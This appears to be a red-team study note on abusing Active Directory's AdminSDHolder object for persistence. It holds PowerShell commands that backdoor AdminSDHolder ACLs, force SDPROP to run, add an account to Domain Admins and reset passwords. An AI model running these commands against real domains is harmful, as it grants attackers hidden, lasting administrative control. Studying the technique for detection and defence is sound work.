---
tags:
  - persistence
title:
  - AdminSDHolder
aliases:
---
- Resides in the System container of a domain and used to control permissions - using an [[access_control_model]] - for certain built-in privileged groups (called Protected Groups). 
- Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL.

| List of Protected Groups     |
| ---------------------------- |
| Account Operators            |
| Backup Operators             |
| Server Operators             |
| Print Operators              |
| Domain Admins                |
| Replicator                   |
| Enterprise Admins            |
| Domain Controllers           |
| Read-only Domain Controllers |
| Schema Admins                |
| Administrators               |
Well known abuse of some of the Protected Groups, all of which can log on locally to DC

| Protected Group   | How it is abused                                                                     |
| ----------------- | ------------------------------------------------------------------------------------ |
| Account Operators | Cannot modify DA/EA/BA groups. Can modify nested group within these groups.          |
| Backup Operators  | Backup GPO, edit to add SID of controlled account to a privileged group and Restore. |
| Server Operators  | Run a command as system (using the disabled Browser service)                         |
| Print Operators   | Copy ntds.dit backup, load device drivers.                                           |
- With Domain Admin privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object.
- In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC groups like Domain Admins without actually being a member of it.

```powershell title:"Add FullControl permissions for a user to the AdminSDHolder as Domain Admin (using PowerView)"
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,domain-controller,DC=domain,DC=name' -PrincipalIdentity username -Rights All -PrincipalDomain domain.name -TargetDomain domain.name -Verbose
```

```powershell title:"Add FullControl permissions for a user to the AdminSDHolder as Domain Admin (using ActiveDirectory Module and RACE toolkit)"
Set-DCPermissions -Method AdminSDHolder -SAMAccountName username -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=domain,DC=name' -Verbose
```

Other rights such as `ResetPassword` and `WriteMembers` can also be used.

```powershell title:"Run SDProp manually"
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
```

```powershell title:"Run SDProp manually for pre-Server 2008 machines"
Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```

#### Check DA permission

```powershell title:"Check the Domain Admins permission (PowerView)"
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "username"}
```

```powershell title:"Check the Domain Admins permission (ActiveDirectory module)"
(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=domain,DC=name').Access | ?{$_.IdentityReference -match 'username'}
```

#### Abuse FullControl permissions

```powershell title:"Abusing FullControl (PowerView)"
Add-DomainGroupMember -Identity 'Domain Admins' -Members illicituser -Verbose
```

```powershell title:"Abusing FullControl (ActiveDirectory Module)"
Add-ADGroupMember -Identity 'Domain Admins' -Members illicituser
```

#### Abuse ResetPassword permissions

```powershell title:"Abusing ResetPassword (PowerView)"
Set-DomainUserPassword -Identity illicituser -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

```powershell title:"Abusing ResetPassword (ActiveDirectory Module)"
Set-ADAccountPassword -Identity illicituser -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

